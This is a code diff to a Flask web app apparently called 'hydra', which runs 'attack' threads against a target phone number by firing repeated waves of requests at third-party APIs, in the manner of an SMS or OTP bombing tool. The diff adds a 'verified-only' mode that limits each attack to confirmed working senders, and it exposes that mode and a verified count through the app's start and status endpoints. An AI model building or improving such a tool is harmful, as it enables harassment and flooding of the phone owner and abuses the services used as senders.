@@ -41,7 +41,7 @@ except ImportError:
     _REPORTER_OK = False
 
 from hydra_v4 import (
-    TARGETS, RECOVERY_TARGETS, STOP,
+    TARGETS, RECOVERY_TARGETS, VERIFIED_TARGETS, STOP,
     run_wave, liveness_check, save_log, session_log, db_get_stats,
     _AUTOSYNC_AVAILABLE, _DB_PATH,
     _PHP_AVAILABLE,   # Phase 9 — PHP bridge availability
@@ -126,13 +126,16 @@ def _on_result(r: dict):
 # ─────────────────────────────────────────────────────────────
 #  ATTACK RUNNER  (background thread)
 # ─────────────────────────────────────────────────────────────
-def _run_attack(phone: str, mode: str, category: str, stagger: float, max_waves: int, dual_vector: bool = False):
+def _run_attack(phone: str, mode: str, category: str, stagger: float, max_waves: int, dual_vector: bool = False, verified_only: bool = False):
     global _active_targets
     STOP.clear()
     _state.update(running=True, phone=phone, wave=0, sent=0, blocked=0, ratelimited=0, fake200=0)
 
-    targets = [t for t in _active_targets if category == "all" or t.get("category") == category]
-    _push_log(f"HYDRA ONLINE — Target: {phone}  |  APIs: {len(targets)}  |  Mode: {mode}", "sys")
+    # verified_only mode: skip all unproven APIs — only fire confirmed senders
+    source = VERIFIED_TARGETS if verified_only else _active_targets
+    targets = [t for t in source if category == "all" or t.get("category") == category]
+    mode_label = f"{mode}/verified-only" if verified_only else mode
+    _push_log(f"HYDRA ONLINE — Target: {phone}  |  APIs: {len(targets)}  |  Mode: {mode_label}", "sys")
 
     wave    = 0
     debug   = (mode == "debug")
@@ -251,7 +254,8 @@ threading.Thread(target=_init_targets, daemon=True).start()
 @app.route("/api/status")
 def api_status():
     s = dict(_state)
-    s["api_count"]   = len(_active_targets)
+    s["api_count"]        = len(_active_targets)
+    s["verified_count"]   = len(VERIFIED_TARGETS)
     # Phase 9 — PHP bridge availability
     s["php_bridge"]  = bool(_PHP_AVAILABLE)
     s["php_version"] = _PHP_AVAILABLE if _PHP_AVAILABLE else None
@@ -310,6 +314,7 @@ def api_start():
     stagger  = float(body.get("stagger", 0.3))
     max_waves= int(body.get("maxWaves", 0))
     dual_vec = bool(body.get("dualVector", False))
+    verified_only = bool(body.get("verifiedOnly", False))
 
     if not phone.isdigit() or len(phone) < 10:
         return jsonify({"ok": False, "error": "Invalid phone number"})
@@ -320,7 +325,7 @@ def api_start():
 
     _attack_thread = threading.Thread(
         target=_run_attack,
-        args=(phone, mode, category, stagger, max_waves, dual_vec),
+        args=(phone, mode, category, stagger, max_waves, dual_vec, verified_only),
         daemon=True,
         name="hydra-attack"
     )
